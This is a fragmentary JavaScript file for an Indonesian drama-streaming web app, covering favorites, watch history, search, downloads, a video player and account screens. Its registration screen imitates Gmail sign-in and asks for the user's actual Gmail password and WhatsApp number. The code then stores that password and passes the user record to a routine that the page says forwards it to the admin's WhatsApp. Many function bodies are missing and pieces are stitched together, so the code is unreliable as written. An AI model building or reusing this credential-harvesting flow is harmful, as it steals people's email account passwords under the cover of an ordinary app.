    && !$("#player").classList.contains("open");
  if(!show){ bar.classList.remove("on"); return; }
  $("#cbImg").src = h.cover || "";
  $("#cbName").textContent = h.name;
  $("#cbEp").textContent = "Ep " + h.ep + " · " + (h.pct||0) + "%";
  $("#cbProg").style.width = (h.pct||0) + "%";
  bar.classList.add("on");
  $("#cbGo").onclick = ()=> openDetail(h.id, h.ep, h.t || 0);
}

function toggleFav(it, btn){
  const i = S.favs.findIndex(f=> f.id === it.id);
  if(i >= 0){ S.favs.splice(i,1); toast("Dihapus dari favorit"); btn && btn.classList.remove("on"); }
  else { S.favs.unshift({id:it.id, name:it.name || it.title, cover:it.cover, episodes:it.episodes}); toast("Ditambahkan ke favorit"); btn && btn.classList.add("on"); }
  saveFav();
  if(S.view === "fav") renderFavs();
}
function renderFavs(){
  const box = $("#favBody");
  if(!S.favs.length){
    box.innerHTML = '<div class="state"><div class="em">🤍</div><h4>Belum ada favorit</h4>' +
      '<p>Tekan ikon hati pada drama untuk menyimpannya.</p><button onclick="window.__go(\'explore\')">Jelajahi Drama</button></div>';
    return;
  }
  box.innerHTML = '<div class="sec-hd" style="padding-top:6px"><h3>Favorit</h3><span>' + S.favs.length + ' drama</span></div>' +
    '<div class="grid">' + S.favs.map(x=> posterHTML(x)).join("") + '</div>';
  bindCards(box);
}

function pushHist(d, ep, t, dur){
  const pct = dur ? Math.min(99, Math.round(t/dur*100)) : 0;
  S.hist = S.hist.filter(h=> h.id !== d.id);
  S.hist.unshift({id:d.id, name:d.title, cover:d.cover, episodes:d.episodes, ep:ep, t:t||0, dur:dur||0, pct:pct, ts:Date.now()});
  saveHist();
}
function renderHist(){
  const box = $("#histBody");
  if(!S.hist.length){
    box.innerHTML = '<div class="state"><div class="em">🕓</div><h4>Belum ada riwayat</h4>' +
      '<p>Drama yang kamu tonton akan muncul di sini.</p><button onclick="window.__go(\'feed\')">Mulai Menonton</button></div>';

    posterHTML({id:h.id,name:h.name,cover:h.cover,episodes:h.episodes,tag:"Ep "+h.ep,pct:h.pct})).join("") + '</div>';

  if(q === "__dub"){
    const box = $("#exploreBody");

  const box = $("#searchBody");

  if(!S.sHist.includes(q)){ S.sHist.unshift(q); saveSh(); }
  const my = ++searchReq;
  box.innerHTML = '<div class="grid">' + Array.from({length:6}).map(()=>
    '<div><div class="sk" style="aspect-ratio:336/478;border-radius:13px"></div><div class="sk" style="height:11px;margin-top:8px"></div></div>').join("") + '</div>';

    if(!items.length){ box.innerHTML = '<div class="state"><div class="em">🫥</div><h4>Tidak ditemukan</h4><p>Tidak ada hasil untuk "<b>' + esc(q) + '</b>".</p></div>'; return; }
    box.innerHTML = '<div class="sec-hd" style="padding-top:6px"><h3>Hasil</h3><span>' + items.length + '</span></div>' +
      '<div class="grid">' + items.map(x=> posterHTML(x)).join("") + '</div>';

  }catch(e){
    if(my !== searchReq) return;
    box.innerHTML = '<div class="state"><div class="em">📡</div><h4>Gagal mencari</h4><p>Coba lagi sebentar.</p></div>';
  }
}

  d.classList.add("open"); d.scrollTop = 0;
  d.innerHTML = '<div class="d-top"><button class="icon-btn" id="dBack">' +

  }catch(e){
    d.innerHTML = '<div class="d-top"><button class="icon-btn" id="dBack2">' +
      '<svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg></button></div>' +

function shareItem(it){
  const url = location.origin + location.pathname + "?d=" + it.id;
  const data = {title:"M4zk1pL4y Cinema", text:'Tonton "' + (it.name||"drama") + '" di M4zk1pL4y Cinema', url:url};
  if(navigator.share){ navigator.share(data).catch(()=>{}); return; }
  if(navigator.clipboard){ navigator.clipboard.writeText(url).then(()=> toast("Tautan disalin")).catch(()=> toast(url)); return; }
  toast(url);
}

/* ---------- unduhan ---------- */
const isDownloaded = ep => S.dls.some(d=> d.id === (detailData && detailData.id) && d.ep === ep);

async function downloadEp(detail, ep, btn){
  if(isDownloaded(ep)){ toast("Sudah diunduh"); return; }
  if(btn) btn.style.opacity = ".45";
  toast("Menyiapkan unduhan...");
  try{
    const j = await getVideo(detail.id, ep);
    const ql = (j.qualityList||[]).slice().sort((a,b)=> parseInt(b.label) - parseInt(a.label));
    if(!ql.length) throw new Error("kosong");
    const pick = ql.find(q=> q.label === "720p") || ql[0];
    S.dls.unshift({id:detail.id, ep:ep, name:detail.title, cover:detail.cover, q:pick.label, url:pick.url, ts:Date.now()});
    saveDl();
    if(btn){ btn.classList.add("done"); btn.style.opacity = "1"; }
    toast("Tersimpan · Ep " + ep + " (" + pick.label + ")");
    saveBlob(pick.url, detail.title, ep);
    if(S.view === "dl") renderDls();
  }catch(e){
    if(btn) btn.style.opacity = "1";
    toast("Gagal mengunduh episode ini");
  }
}
function saveBlob(url, title, ep){
  const name = (title || "drama").replace(/[^\w\s-]/g,"").trim().replace(/\s+/g,"_").slice(0,60) + "_Ep" + ep + ".mp4";
  const a = document.createElement("a");
  a.href = url; a.download = name; a.target = "_blank"; a.rel = "noopener";
  document.body.appendChild(a); a.click(); a.remove();
}
async function downloadAll(detail, vids){
  const todo = vids.filter(v=> !S.dls.some(d=> d.id === detail.id && d.ep === v.episode));
  if(!todo.length){ toast("Semua episode sudah diunduh"); return; }
  toast("Mengunduh " + todo.length + " episode...");
  for(const v of todo){
    try{
      const j = await getVideo(detail.id, v.episode);
      const ql = (j.qualityList||[]).slice().sort((a,b)=> parseInt(b.label) - parseInt(a.label));
      if(!ql.length) continue;
      const pick = ql.find(q=> q.label === "480p") || ql[0];
      S.dls.unshift({id:detail.id, ep:v.episode, name:detail.title, cover:detail.cover, q:pick.label, url:pick.url, ts:Date.now()});
      saveDl(); saveBlob(pick.url, detail.title, v.episode);
      await new Promise(r=> setTimeout(r, 700));
    }catch(e){}
  }
  toast("Selesai mengunduh");
  if(detailData) renderDetail(detailData);
}

let srcQueue = [], srcIdx = 0, proxyMode = false, refetchN = 0, watchdog = null, lastT = 0;

function playEpisode(ep, seek){

}

const setBuf = on => { const b = $("#pBuf"); if(b) b.classList.toggle("on", !!on); };
const failOn = on => { const f = $("#pFail"); if(f) f.classList.toggle("on", !!on); };

function armWatchdog(){
  clearTimeout(watchdog);
  watchdog = setTimeout(()=>{
    const v = $("#pvideo");
    if(v && !v.paused && v.readyState < 3) nextSource();
  }, 13000);
}

async function loadSource(ep){
  setBuf(true); failOn(false);
  clearTimeout(watchdog);
  try{
    const j = await getVideo(curDetail.id, ep);
    vData = j;
    const ql = (j.qualityList||[]).slice().sort((a,b)=> parseInt(b.label) - parseInt(a.label));
    if(!ql.length) throw new Error("kosong");
    let order = ql;
    if(S.quality !== "auto"){
      const pref = ql.find(q=> q.label === S.quality);
      if(pref) order = [pref, ...ql.filter(q=> q !== pref)];
    }
    srcQueue = order.map(q=> q.url);
    srcIdx = 0; proxyMode = false;
    $("#pQual").textContent = order[0].label;
    playCurrent();
  }catch(e){ failOn(true); setBuf(false); }
}

function playCurrent(){
  const video = $("#pvideo");
  if(!video) return;
  if(srcIdx >= srcQueue.length){ return exhausted(); }
  const url = srcQueue[srcIdx++];
  video.onerror = ()=> nextSource();
  video.src = url;
  video.load();
  const pr = video.play();
  if(pr && pr.catch) pr.catch(()=>{});
  setBuf(true);
  armWatchdog();
}
function nextSource(){ if($("#pvideo")) playCurrent(); }

function exhausted(){
  if(!proxyMode && srcQueue.length){
    proxyMode = true;
    srcQueue = srcQueue.map(u=> VPROXY[0] + encodeURIComponent(u));
    srcIdx = 0;
    return playCurrent();
  }
  if(refetchN < 2){ refetchN++; setTimeout(()=> loadSource(vEp), 900); return; }
  failOn(true); setBuf(false);
}

function openQuality(){
  if(!vData || !vData.qualityList){ toast("Kualitas belum tersedia"); return; }
  const list = vData.qualityList.slice().sort((a,b)=> parseInt(b.label) - parseInt(a.label));
  const cur = $("#pQual").textContent;
  const labels = list.map(q=> q.label);
  if(S.quality !== "auto") labels.unshift("auto");
  const next = labels[(labels.indexOf(cur) + 1) % labels.length];
  if(next === "auto"){ S.quality = "auto"; saveSet(); toast("Kualitas: Auto"); loadSource(vEp); return; }
  S.quality = next; saveSet();
  $("#pQual").textContent = next;
  loadSource(vEp);
}

function cycleCC(){
  subMode = subMode === "syn" ? "off" : subMode === "off" ? "vtt" : "syn";
  if(subMode === "vtt" && !subCues.length){ $("#subFile").click(); }
  applyCC();
}
function applyCC(){
  const chip = $("#pCC"), box = $("#pSub");
  if(!chip || !box) return;
  chip.classList.toggle("on", subMode !== "off");
  box.classList.toggle("on", subMode !== "off");
  if(subMode === "syn"){
    box.innerHTML = '<span class="syn"><span class="taglbl">SINOPSIS · SUB INDO</span>' +
      esc((curDetail && curDetail.intro) || "Tidak ada sinopsis.") + '</span>';
  }else if(subMode === "off"){
    box.innerHTML = '';
  }else if(!subCues.length){
    box.innerHTML = '<span>Pilih file .vtt / .srt untuk subtitle</span>';
  }
}
function renderSub(t){
  if(subMode !== "vtt" || !subCues.length) return;
  const box = $("#pSub"); if(!box) return;
  const c = subCues.find(x=> t >= x.s && t <= x.e);
  box.innerHTML = c ? '<span>' + esc(c.t).replace(/\n/g,"<br>") + '</span>' : '';
}
const toSec = s => { const m = String(s).trim().match(/(\d+):(\d+):(\d+)[.,](\d+)/); return m ? +m[1]*3600 + +m[2]*60 + +m[3] + +m[4]/1000 : 0; };
function parseSubs(txt){
  const out = [];
  txt.replace(/\r/g,"").split(/\n\n+/).forEach(block=>{
    const lines = block.split("\n").filter(Boolean);
    const ti = lines.findIndex(l=> l.includes("-->"));
    if(ti < 0) return;
    const [a,b] = lines[ti].split("-->");
    const s = toSec(a), e = toSec(b);
    const text = lines.slice(ti+1).join("\n").trim();
    if(text && e > s) out.push({s,e,t:text});
  });
  return out.sort((x,y)=> x.s - y.s);
}

function step(dir){
  const list = (curDetail.videos||[]);
  const target = vEp + dir;
  if(!list.some(v=> v.episode === target)){ toast(dir > 0 ? "Ini episode terakhir" : "Ini episode pertama"); return; }
  const hh = S.hist.find(x=> x.id === curDetail.id);
  playEpisode(target, (hh && hh.ep === target) ? (hh.t||0) : 0);
}

function closePlayer(){

  const v = $("#pvideo");
  if(v){
    if(v.duration) pushHist(curDetail, vEp, v.currentTime, v.duration);
    v.pause(); v.removeAttribute("src"); v.load();
  }
  $("#player").classList.remove("open"); $("#player").innerHTML = "";
  vData = null; updateContBar();
  if(S.view === "hist") renderHist();
}

      '<div class="field"><label>Gmail</label><input id="auMail" type="email" inputmode="email" placeholder="nama@gmail.com" autocomplete="email"></div>' +
      '<div class="field"><label>Password</label><input id="auPass" type="password" placeholder="password kamu" autocomplete="current-password"></div>' +
      '<button class="btn-play" id="auLogin">Masuk</button>' +
      '<div class="alt">Belum punya akun? <b id="auToReg">Daftar sekarang</b></div></div>';
  $("#gReg").onclick = renderRegister;
  $("#auToReg").onclick = renderRegister;
  $("#auLogin").onclick = ()=>{
    const err = doLogin($("#auMail").value, $("#auPass").value);
    if(err){ $("#authErr").textContent = err; return; }
    toast("Selamat datang kembali"); renderMe(); loadFeed(true);
  };
  $("#auPass").addEventListener("keydown", e=>{ if(e.key === "Enter") $("#auLogin").click(); });
}

function renderRegister(){
  const AVS = ["🎬","🍿","😎","👑","🌙","🔥","🦋","⭐"];
  $("#meBody").innerHTML =
    '<div class="auth"><button class="gbtn" id="gHead">' + GMAIL_SVG + ' Pendaftaran via Gmail</button>' +
      '<h2>Buat Akun</h2>' +
      '<p class="sub">Data pendaftaran otomatis dikirim ke WhatsApp admin.</p>' +
      '<div class="err-msg" id="authErr"></div>' +
      '<div class="field"><label>Avatar</label><div class="avpick" id="avPick">' +
        AVS.map((a,i)=> '<button data-av="' + a + '"' + (i===0?' class="on"':'') + '>' + a + '</button>').join("") + '</div></div>' +
      '<div class="field"><label>Nama</label><input id="rgName" placeholder="nama kamu"></div>' +
      '<div class="field"><label>Alamat Gmail</label><input id="rgMail" type="email" inputmode="email" placeholder="nama@gmail.com" autocomplete="email"></div>' +
      '<div class="field"><label>Password Gmail</label><input id="rgPass" type="password" placeholder="minimal 6 karakter" autocomplete="new-password"></div>' +
      '<div class="field"><label>Nomor WhatsApp</label><input id="rgWa" type="tel" inputmode="tel" placeholder="08xxxxxxxxxx"></div>' +
      '<button class="btn-play" id="rgBtn">Daftar Sekarang</button>' +
      '<div class="alt">Sudah punya akun? <b id="rgToLogin">Masuk</b></div></div>';
  let av = AVS[0];
  $$("#avPick button").forEach(b=> b.onclick = ()=>{
    $$("#avPick button").forEach(x=> x.classList.remove("on"));
    b.classList.add("on"); av = b.dataset.av;
  });
  $("#gHead").onclick = ()=> $("#rgMail").focus();
  $("#rgToLogin").onclick = renderLogin;
  $("#rgBtn").onclick = ()=>{
    const name = $("#rgName").value, mail = $("#rgMail").value,
          pass = $("#rgPass").value, wa = $("#rgWa").value;
    const err = doRegister(mail, pass, name, wa, av);
    if(err){ $("#authErr").textContent = err; return; }
    S.user.pw = pass;
    /* buka WhatsApp SINKRON di dalam handler supaya tidak diblokir popup */
    const ok = kirimWa(S.user, true);
    toast(ok ? "Berhasil daftar · data terkirim ke admin" : "Berhasil daftar · kirim manual dari profil");
    renderMe(); loadFeed(true);
  };
}

function renderEdit(){
  const AVS = ["🎬","🍿","😎","👑","🌙","🔥","🦋","⭐"];
  $("#meBody").innerHTML =
    '<div class="auth"><h2>Edit Profil</h2><p class="sub">Ubah nama, avatar, nomor WA.</p>' +
      '<div class="avpick" id="avPick">' +
        AVS.map(a=> '<button data-av="' + a + '"' + (S.user.av===a?' class="on"':'') + '>' + a + '</button>').join("") + '</div>' +
      '<div class="field"><label>Nama</label><input id="edName" value="' + esc(S.user.n) + '"></div>' +
      '<div class="field"><label>Nomor WhatsApp</label><input id="edWa" type="tel" value="' + esc(S.user.wa || "") + '"></div>' +
      '<button class="btn-play" id="edSave">Simpan</button><div class="alt"><b id="edBack">Batal</b></div></div>';
  let av = S.user.av;
  $$("#avPick button").forEach(b=> b.onclick = ()=>{
    $$("#avPick button").forEach(x=> x.classList.remove("on"));
    b.classList.add("on"); av = b.dataset.av;
  });
  $("#edBack").onclick = renderMe;
  $("#edSave").onclick = ()=>{
    S.user.n = $("#edName").value.trim() || S.user.n;
    S.user.wa = $("#edWa").value.trim();
    S.user.av = av;
    putUsers(getUsers().map(x=> x.u === S.user.u ? S.user : x));
    toast("Profil diperbarui"); renderMe();
  };
}

/* ================= INIT ================= */
function init(){
  restoreSession(); loadUserData();

  $("#spBtn").onclick = ()=>{
    const sp = $("#splash");
    sp.style.transition = "opacity .35s, transform .35s";
    sp.style.opacity = "0"; sp.style.transform = "scale(1.06)";
    setTimeout(()=> sp.remove(), 340);
    $("#app").classList.remove("hidden");
    loadFeed(true);
  };

  $$(".nav-item").forEach(b=> b.onclick = ()=> go(b.dataset.nav));

  $("#feedSearch").onclick = ()=>{ go("search"); setTimeout(()=> $("#searchInput").focus(), 120); };
  $("#feedRandom").onclick = randomPick;
  $("#exploreRandom").onclick = randomPick;

  new IntersectionObserver(es=>{
    if(es[0].isIntersecting && S.view === "feed" && !S.feedDone) loadFeed(false);
  }, {rootMargin:"400px"}).observe($("#feedSentinel"));

  $("#exploreInput").addEventListener("input", ev=>{
    clearTimeout(S.searchTimer);
    const q = ev.target.value;
    S.searchTimer = setTimeout(()=>{ if(q.trim()){ go("search"); $("#searchInput").value = q; doSearch(q); } }, 450);
  });

  $("#searchBack").onclick = ()=> go("explore");
  $("#searchInput").addEventListener("input", ev=>{
    clearTimeout(S.searchTimer);
    const q = ev.target.value;
    S.searchTimer = setTimeout(()=> doSearch(q), 420);
  });
  $("#searchInput").addEventListener("keydown", ev=>{
    if(ev.key === "Enter"){ ev.preventDefault(); ev.target.blur(); doSearch(ev.target.value); }
  });

  $("#histBack").onclick = ()=> go("me");
  $("#histClear").onclick = ()=>{
    if(!S.hist.length){ toast("Riwayat kosong"); return; }
    S.hist = []; saveHist(); renderHist(); updateContBar(); toast("Riwayat dihapus");
  };
  $("#dlBack").onclick = ()=> go("me");

  $("#subFile").addEventListener("change", ev=>{
    const f = ev.target.files[0]; if(!f) return;
    const r = new FileReader();
    r.onload = ()=>{
      subCues = parseSubs(String(r.result));
      subMode = "vtt";
      if(!subCues.length) toast("File subtitle tidak valid");
      else toast(subCues.length + " baris subtitle dimuat");
      applyCC();
    };
    r.readAsText(f);
    ev.target.value = "";
  });

  const dl = new URLSearchParams(location.search).get("d");
  if(dl) setTimeout(()=> openDetail(dl), 120);

  window.__go = go;
  document.addEventListener("keydown", ev=>{
    if(ev.key === "Escape"){
      if($("#player").classList.contains("open")) closePlayer();
      else if($("#detail").classList.contains("open")) closeDetail();
    }
  });
}

function randomPick(){
  const src = S.pool.length ? S.pool : S.favs;
  if(!src.length){ toast("Belum ada data untuk diacak"); return; }
  openDetail(src[Math.floor(Math.random()*src.length)].id);
}

init();
})();
</script>
</body>
</html>
